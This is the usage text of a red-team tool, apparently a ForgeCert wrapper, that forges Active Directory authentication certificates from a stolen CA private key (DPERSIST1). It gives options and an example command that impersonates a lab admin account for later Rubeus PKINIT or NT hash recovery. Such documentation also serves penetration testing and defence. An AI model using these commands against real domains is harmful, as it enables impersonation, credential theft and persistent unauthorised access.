ABOUT
    Forges Active Directory authentication certificates using a stolen CA private key
    (.pfx or .p12). Implements DPERSIST1 from Certified Pre-Owned. Output .pfx can be
    used with Rubeus for PKINIT or NT hash recovery.

USAGE:
    net-forge-cert --- --CaCertPath <path> --SubjectAltName <UPN> --NewCertPath <path> --NewCertPassword <password> [options]

OPTIONS:
    --CaCertPath         Required. CA certificate and private key as .pfx or .p12
    --CaCertPassword     Password for the CA private key file
    --Subject            Subject DN in the forged certificate (default: CN=User)
    --SubjectAltName     Required. UPN of the user to authenticate as
    --NewCertPath        Required. Output path for the forged .pfx
    --NewCertPassword    Required. Password for the output .pfx
    --CRL                Optional LDAP path to a CRL for the forged certificate chain
    --Serial             Optional serial number for the forged certificate

EXAMPLES:
    net-forge-cert --- --CaCertPath ca.pfx --CaCertPassword "Password123!" --Subject "CN=User" --SubjectAltName "localadmin@theshire.local" --NewCertPath localadmin.pfx --NewCertPassword "NewPassword123!"
